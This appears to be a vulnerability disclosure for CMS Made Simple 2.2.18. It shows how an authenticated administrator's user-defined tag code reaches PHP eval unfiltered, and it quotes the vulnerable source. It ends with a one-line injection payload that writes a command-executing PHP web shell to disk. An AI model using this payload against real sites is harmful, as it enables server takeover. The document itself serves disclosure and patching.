# Code-Execution-Vulnerability-in-CMS-Made-Simple-V2.2.18
CMS Made Simple v2.2.18 there is a post-authentication command execution vulnerability, the vulnerability location is:cmsms-2.2.18-install/admin/listusertags.php

Vulnerability Title: Code Execution Vulnerability in CMS Made Simple

Affected Version: V2.2.18

 Discovery time: 2023.11.14

 Discovered by: t34t

 Analysis Report: 

(A) vulnerability verification process
Vulnerability environment: `windows + phpstudy`
The source code is downloaded from the official website:
`https://s3.amazonaws.com/cmsms/downloads/15079/cmsms-2.2.18-install.zip`
Then follow the prompts to install a key can be.
**Vulnerability details:**
Login  to the administrator background, in the extension section, you can set user-defined tags


![Image](https://github.com/users/t34t/projects/3/assets/19178256/670eeda0-46f4-4f84-adbd-0f305c717f7d)


The system executes the code entered by the user and generates php backdoor 1.php in the background, which can then be accessed to execute any command, as shown in the figure:



![Image](https://github.com/users/t34t/projects/3/assets/19178256/56ffd5c7-75ba-4473-be1f-1f126cea42c0)


Execute the command:


![Image](https://github.com/users/t34t/projects/3/assets/19178256/36f911da-4bd5-4585-bb31-8e47cab87628)



(B) Vulnerable code audit
Code that generates vulnerabilities:
`C:\phpstudy_pro\WWW\cmsms-2.2.18-install\admin\editusertag.php

$error = array();
if( isset($_POST['submit']) || isset($_POST['apply']) ) {
    $record['userplugin_name'] = trim(cleanValue($_POST['userplugin_name']));
    **$record['code'] = trim($_POST['code']);**
    $record['description'] = trim(cleanValue($_POST['description']));

    if( isset($_POST['userplugin_id']) ) {
        $userplugin_id = (int) $_POST['userplugin_id'];
        if( $userplugin_id < 1 ) $userplugin_id = null;
    }

    // validate
    if( $record['userplugin_name'] == '' ) {
        $error[] = lang('nofieldgiven',array(lang('name')));
    }
    elseif(preg_match('<^[ a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$>',$record['userplugin_name'])==0) {
        $error[] = lang('error_udt_name_chars');
        $validinfo = false;
    }
    else {
        // check for duplicate name.
        $all_tags = $tagops->ListUserTags();
        foreach( $all_tags as $id => $name ) {
            if( $name == $record['userplugin_name'] ) {
                if( $id != $record['userplugin_id'] ) $error[] = lang('usertagexists');
            }
        }
    }

    if( $record['code'] == '' ) $error[] = lang('nofieldgiven', array(lang('code')));

    **$code = $record['code'];
    if( startswith($code,'<?php') ) $code = substr($code,5);
    if( endswith($code,'?>') ) $code = substr($code,0,-2);**

    $lastopenbrace = strrpos($code, '{');
    $lastclosebrace = strrpos($code, '}');
    if ($lastopenbrace > $lastclosebrace) {
        $error[] = lang('invalidcode');
        $error[] = lang('invalidcode_brace_missing');
    }
  
    if( count($error) == 0 ) {
        srand();
        ob_start();
        if (**eval('function testfunction'.rand().'() {'.$code."\n}"**) === FALSE) {
            $error[] = lang('invalidcode');
            $buffer = ob_get_clean();
            //add error
            $error[] = preg_replace('/<br \/>/', '', $buffer );
            $validinfo = false;
        }
        else {
            ob_get_clean();
        }
    }`
As you can see, the code parameter passed in by the user is spliced into the eval function without strict filtering, and all that is needed is to close the string in eval and add the code that the attacker wants to execute.
The specific payload is :};system('echo "<?php @system($_GET[c]);? >">1.php');/*

 Patch Program:
Detailed filtering of user-entered code fields

